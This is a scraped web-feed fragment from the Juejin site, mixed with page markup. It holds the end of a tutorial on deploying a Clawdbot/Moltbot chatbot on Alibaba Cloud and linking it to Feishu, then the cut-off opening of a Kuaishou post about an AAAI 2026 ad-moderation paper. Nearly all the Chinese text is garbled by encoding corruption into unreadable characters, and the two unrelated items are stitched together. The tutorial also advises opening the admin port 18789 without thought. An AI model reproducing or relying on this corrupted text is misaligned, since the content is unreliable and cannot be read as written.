clawdbot config <span class="hljs-keyword">set</span> agents.defaults.model.primary <span class="hljs-string">"bailian/qwen-vl-plus"</span># å¿…é¡»é‡å¯ï¼Œè®© <span class="hljs-type">Moltbot</span> ä¸»åŠ¨å»å‹¾æ­é£ä¹¦ï¼Œåç»­åå°ä¿å­˜æ‰èƒ½é€šè¿‡
clawdbot gateway restart
</code></pre>
<p><strong>é˜¿æ˜Ÿæç¤ºï¼š</strong> Â åªæœ‰é‡å¯ç½‘å…³åï¼Œå†å»é£ä¹¦åå°ç‚¹å‡»â€œä¿å­˜é•¿è¿æ¥â€ï¼Œä½ ä¼šå‘ç°é•¿è¿æ¥ç¬é—´å˜ç»¿ï¼Œå½»åº•è”é€šã€‚</p>
<h2 data-id="heading-8"><strong>é£ä¹¦åå°æ¿€æ´»</strong></h2>
<ol>
<li>
<p>1.Â <strong>å¼€å¯é•¿è¿æ¥</strong>Â ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92c0d4f00dee4decbbbc8d7b71f52449~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=lpwghV8Oi4GIHARvPh9ksphZin4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
</li>
<li>
<ol>
<li>
<ol>
<li>å›åˆ°é£ä¹¦å¼€å‘è€…åå°ï¼Œè¿›å…¥Â <strong>ã€Œäº‹ä»¶ä¸å›è°ƒã€</strong>Â ã€‚</li>
</ol>
</li>
<li>
<ol start="2">
<li>è®¢é˜…æ–¹å¼é€‰æ‹©Â <strong>ã€Œä½¿ç”¨é•¿è¿æ¥ã€</strong>Â ï¼ˆå› ä¸ºä½ ä¸Šä¸€æ­¥å·²ç»åœ¨äº‘ç«¯å¯åŠ¨å¥½äº†ï¼Œè¿™é‡Œç›´æ¥ç‚¹ä¿å­˜å°±èƒ½æˆåŠŸï¼‰ã€‚</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>ç„¶åç‚¹å‡»å³è¾¹æ·»åŠ äº‹ä»¶åŠ æƒé™ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed17eaee852e4b1f8609ec669b10e062~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=pJ5tWpMlF2RnM%2Fz5TcZtBN7l2SY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>3.Â <strong>å‘å¸ƒä¸Šçº¿</strong>Â ï¼šè¿›å…¥Â <strong>ã€Œç‰ˆæœ¬ç®¡ç†ä¸å‘å¸ƒã€</strong>Â ï¼ŒÂ <strong>åˆ›å»ºç‰ˆæœ¬</strong>Â ï¼ˆç‰ˆæœ¬å·éšä¾¿å†™ï¼Œæ¯”å¦‚1.0.0ï¼‰ï¼Œç„¶åÂ <strong>ä¿å­˜å¹¶å‘å¸ƒã€‚</strong></li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/502f61fca7a844be801d824580e3263c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=wyc5QBOnSf%2FlMlEXXa2xWdw1nko%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>
<ol start="4">
<li>å¦‚æœä½ æƒ³æ·»åŠ åˆ°å¤–éƒ¨ç¾¤ï¼Œåœ¨Â <strong>ç‰ˆæœ¬ç®¡ç†ä¸å‘å¸ƒ</strong>Â é¡µé¢å³ä¸Šè§’ï¼Œç‚¹å‡»Â <strong>åˆ›å»ºç‰ˆæœ¬</strong>Â ã€‚åœ¨Â <strong>ç‰ˆæœ¬è¯¦æƒ…</strong>Â é¡µé¢é€‰ä¸­Â <strong>å…è®¸æœºå™¨äººè¢«æ·»åŠ åˆ°å¤–éƒ¨ç¾¤ä¸­ä½¿ç”¨</strong>Â ã€‚ä½†æ˜¯ä¼ä¸šå¿…é¡»å®Œæˆä¼ä¸šæ³•äººè®¤è¯æˆ–åŠ ç›–å…¬ç« æˆæƒä¹¦è®¤è¯ï¼ˆå›¢é˜Ÿè®¤è¯ä¸æ”¯æŒï¼‰æ‰å¯ä»¥ä½¿ç”¨åº”ç”¨å¯¹å¤–å…±äº«èƒ½åŠ›ã€‚</li>
</ol>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7de7cc2095a64e2ea91140a9db8fb66d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=A%2F2EaKQrmkpqgDW5fkmdXWf8hi0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ol>
<li>
<ol start="5">
<li>æ‰€ä»¥æˆ‘æ²¡å¯¹å¤–å»ºç¾¤ï¼Œç›´æ¥è‡ªå·±ç¾¤é‡Œæ·»åŠ è‡ªå·±çš„æœºå™¨äººã€‚</li>
</ol>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5762fa37634e4cd09f8e7c0684200e7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=bE41w9NYrahmRE8yThGn0L5Cu0w%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒå°±èƒ½ç»™ä½ ç•…èŠäº†ï¼Œä½ çš„ä»£ä»·å°±ä¸€ç‚¹é˜¿é‡Œäº‘keyè€Œå·²ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94e244661eb94b9ab7bef08982c7ff98~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=JPvXndYLqWMTPRcBFYaLM1fTFVs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-9">æ–¹æ¡ˆäºŒï¼šé€šè¿‡é˜¿é‡Œäº‘æ¥å…¥</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/497f3b735bb84c07af90eb9901c4d1bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=AjT9qtxNdtzy1JjkXsyfNga2L4s%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™æ­¥æœ€çœå¿ƒï¼Œå› ä¸ºé˜¿é‡Œäº‘æŠŠÂ <strong>ç¯å¢ƒéƒ½ç»™ä½ è£…å¥½äº†</strong>Â ï¼Œä¸ç”¨ä½ å­å“§å­å“§æ•²å‘½ä»¤ã€‚</p>
<ol>
<li>
<p>1.Â <strong>ç§ŸæœåŠ¡å™¨</strong>Â ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b79b4411ca547d099fe70546ff75851~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=3uHbT1y1U9umYEdCUF%2BFnEFkGsg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ff601c7b8214ff28396cf0aa6e36d1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=Ipj4YEY6TtZXM8CGiJXLdtsdSWY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
</li>
<li>
<ol>
<li>5.Â <strong>æœ€å…³é”®ä¸€æ­¥</strong>Â ï¼šé•œåƒåŠ¡å¿…é€‰Â <strong>ã€ŒMoltbotã€</strong>Â ï¼ˆè¿™å°±æ˜¯Clawdbotçš„æ–°å®¶ï¼Œä¸€é”®å…¨åŒ…ï¼‰ã€‚</li>
</ol>
</li>
<li>
<ol>
<li>
<ol start="3">
<li>é€‰æ‹©æŒ‰æœˆä»˜è´¹ï¼Œä¸‹ä¸ªæœˆå¤§å®¶ä¸ä¸€å®šç©å„¿äº†ã€‚</li>
</ol>
</li>
</ol>
</li>
<li>
<ol>
<li>
<ol>
<li>å»Â <strong>é˜¿é‡Œäº‘æ§åˆ¶å°</strong>Â ï¼Œæ‰¾Â  <strong>â€œè½»é‡åº”ç”¨æœåŠ¡å™¨â€</strong> Â ã€‚</li>
</ol>
</li>
</ol>
</li>
</ol>
<ul>
<li>â€¢ ç„¶åå»ç™¾ç‚¼äº‘æ‹¿key</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37bd0e0bc2c447c0803fc8de1e235235~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=mtkDVB2gEB6q0zvlweWPbKRmqlI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å³ä¸Šè§’éšä¾¿åˆ›å»ºä¸€ä¸ªå°±å¯ä»¥äº†ã€‚</p>
<ol>
<li>
<p>2.Â <strong>å¼€ä¸ªé—¨</strong>Â ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eac9453c6f874fe2aa28e7e3d8d2967e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=C6y1wG%2Fd5VnuKhoCt63pQMQ8JiA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
</li>
<li>
<ol>
<li>
<ol>
<li>åœ¨æœåŠ¡å™¨æ§åˆ¶å°çš„ã€Œåº”ç”¨è¯¦æƒ…ã€Â  <strong>ï¼Œæ— è„‘æ”¾è¡ŒÂ <code>18789</code>Â ç«¯å£</strong>Â ï¼ˆè¿™æ˜¯åç»­ç”¨æµè§ˆå™¨ç®¡ç†åå°çš„å…¥å£ï¼‰ã€‚</li>
</ol>
</li>
</ol>
</li>
<li>
<p>3.Â <strong>é…æŠŠâ€œé’¥åŒ™â€</strong> Â ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8649732b54c54dd8b8216fb467007422~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=po1aJG2mWwUvvhfUMADFojm91do%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a879437eb44444f3ba922bced5f06e4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=%2BtgCvklcs%2FeTd3HncmSAGBevlmc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
</li>
<li>
<ol>
<li>
<ol start="3">
<li>å¤åˆ¶ä¿å­˜å¥½ã€‚</li>
</ol>
</li>
</ol>
</li>
<li>
<ol>
<li>
<ol>
<li>å»Â <strong>é˜¿é‡Œäº‘ç™¾ç‚¼æ§åˆ¶å°</strong>Â ï¼Œåœ¨ã€ŒAPI-KEYã€ç®¡ç†é‡ŒÂ <strong>åˆ›å»ºä¸€ä¸ªæ–°çš„Key</strong>Â ï¼Œ</li>
</ol>
</li>
</ol>
</li>
<li>
<p>4.Â <strong>ä¸€é”®é…ç½®</strong>Â ï¼š</p>
<p>Â  å°±å¯ä»¥çœ‹åˆ°è‡ªå·±çš„clawbotäº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fca91e42fab4450981bc822e18347419~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=D0USBgxOwkHSJFv3maGhpWfc3AI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
</li>
<li>
<ol>
<li>
<ol>
<li>å›åˆ°æœåŠ¡å™¨ã€Œåº”ç”¨è¯¦æƒ…ã€ï¼Œç‚¹å‡»Â <strong>ã€Œä¸€é”®é…ç½®ã€.</strong> Â æŠŠåˆšæ‰çš„ç™¾ç‚¼API Keyè´´è¿›å»ï¼Œæ‰§è¡Œã€‚æå®šï¼ŒAIå¤§è„‘åˆå§‹åŒ–å®Œæ¯•ã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bbb3b4fe0df4ccc888b8e4c7d911895~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=vhCJ%2B0EZaljPYnLcM3C%2Bsj4c%2Foo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Â  Â  ç„¶åç‚¹å‡»æ‰“å¼€é¡µé¢åé¢çš„æ‰§è¡Œå‘½ä»¤ï¼Œ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/410bb0c7154340c4a06ba9784e5cec2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=GjE%2F3jQgwRSTFUUGzJbtVI05WEI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Â  Â  å°±èƒ½çœ‹åˆ°åœ°å€ï¼Œ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/65ee2bfd83bb43b4840786707c3c65ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=wkO6QHtp2iNAYHoSZfgsdrmcogk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
</li>
</ol>
</li>
</ol>
<p>åˆ°äº†è¿™ä¸ªé˜¶æ®µä½ å°±å·²ç»èƒ½åœ¨é˜¿é‡Œäº‘ä¸Šç”¨äº†ã€‚æµ‹è¯•ä¸€ä¸‹å³å¯ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ef5ae26e10b49daba8d4f5e4f3e2d0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=x50ndH9IkEyb98OpTPu6FhNqOqc%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™å¥—è·¯å­çš„æœ€å¤§å¥½å¤„ï¼Œå°±æ˜¯Â <strong>é˜¿é‡Œäº‘å¸®ä½ æ‰›ä¸‹äº†æ‰€æœ‰ç¯å¢ƒé…ç½®çš„è„æ´»ç´¯æ´»</strong>Â ï¼Œä½ åªéœ€è¦ä¸“æ³¨äºâ€œè¿æ¥â€å’Œâ€œä½¿ç”¨â€ã€‚å°±æ˜¯Â <strong>ä¸“é—¨ç»™â€œä¸æƒ³æŠ˜è…¾å‘½ä»¤è¡Œâ€çš„æœ‹å‹å‡†å¤‡çš„ã€‚</strong></p>
<p>ç„¶åå†å¾€ä¸‹çœ‹rawï¼Œå°±å¯ä»¥é…ç½®å…¶ä»–æ¨¡å‹json</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c12cb36746a475fbd39ed3f4acd7f3b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=ZlNXjd%2FsVwEbj4vV3WmTjoDuHFU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä»æ­¤ï¼Œä½ çš„é£ä¹¦å’Œé˜¿é‡Œäº‘é‡Œå°±ä½è¿›äº†ä¸€ä¸ªÂ <strong>æ°¸ä¸ä¸‹çº¿ã€éšå«éšåˆ°çš„äº‘ç«¯å¤§è„‘</strong>Â ã€‚</p>
<p>okæˆ‘æ˜¯é˜¿æ˜Ÿæ›´å¤šAIåº”ç”¨</p>
<p>æˆ‘ä»¬ä¸‹æœŸå†è§ğŸ‘‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3da9c2bb91b4472a1d88bf2f6b16443~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5pifQUnlt6XkvZzlrqQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770276990&amp;x-signature=1Rf9Oa%2FAPVx%2FPGlRqMyVojjllW4%3D" alt="8e230dd104215678d7d8e7eaea1f3090.jpg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AAAI 2026ï½œåŸºäºæ€ç»´é“¾ä¸å¼ºåŒ–å­¦ä¹ çš„å¯è§£é‡Šå¤šæ¨¡æ€å¹¿å‘Šå®¡æ ¸æŠ¤æ ]]></title>    <link>https://juejin.cn/post/7600344784946118702</link>    <guid>https://juejin.cn/post/7600344784946118702</guid>    <pubDate>2026-01-29T07:41:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600344784946118702" data-draft-id="7600344784946053166" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AAAI 2026ï½œåŸºäºæ€ç»´é“¾ä¸å¼ºåŒ–å­¦ä¹ çš„å¯è§£é‡Šå¤šæ¨¡æ€å¹¿å‘Šå®¡æ ¸æŠ¤æ "/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,æ¶æ„"/> <meta itemprop="datePublished" content="2026-01-29T07:41:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿«æ‰‹æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/3736571181793721"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AAAI 2026ï½œåŸºäºæ€ç»´é“¾ä¸å¼ºåŒ–å­¦ä¹ çš„å¯è§£é‡Šå¤šæ¨¡æ€å¹¿å‘Šå®¡æ ¸æŠ¤æ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3736571181793721/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿«æ‰‹æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T07:41:18.000Z" title="Thu Jan 29 2026 07:41:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ˜¯å¦åˆ·åˆ°è¿‡è¿™æ ·çš„çŸ­è§†é¢‘å¹¿å‘Šï¼šå¦‚ä½•åœ¨å®¶èººç€æ—¥èµšå‡ ç™¾å—â€ã€â€œé€šè¿‡æ‰‹ç›¸é¢„æµ‹æœªæ¥å§»ç¼˜â€ã€‚åœ¨å¿«æ‰‹å•†ä¸šåŒ–å¹¿å‘Šç´ æå®¡æ ¸è¿‡ç¨‹ä¸­ï¼Œå¿«æ‰‹å•†ä¸šåŒ–ç”Ÿæ€ä¸ä½“éªŒå›¢é˜Ÿæ¯å¤©ä¹Ÿä¼šæ‹¦æˆªå¤§é‡çš„é£é™©ç´ æã€‚è¿™äº›å†…å®¹è½»åˆ™ç ´åç”¨æˆ·ä½“éªŒã€æŸä¼¤å•†ä¸šåŒ–ç”Ÿæ€ï¼Œé‡åˆ™è§¦åŠåº•çº¿é—®é¢˜ã€å±å®³æ•´ä¸ªå•†ä¸šåŒ–ä¸šåŠ¡ã€‚å›¢é˜Ÿçš„ä»»åŠ¡æ˜¯é€šè¿‡æŠ€æœ¯æ‰‹æ®µå°†ä¸‹è¿°è¿™äº›ä¸åŒçš„é£é™©éƒ½è¯†åˆ«å‡ºæ¥å¹¶æ‹¦æˆªã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c862003c8a64886b043b7aed1e50b55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770277277&amp;x-signature=KBhZHw3HRr6pscY94RbvMuS8KBM%3D" alt="" loading="lazy"/></p>
<p>å›¾ 1 é£é™©ç´ ææ¡ˆä¾‹</p>
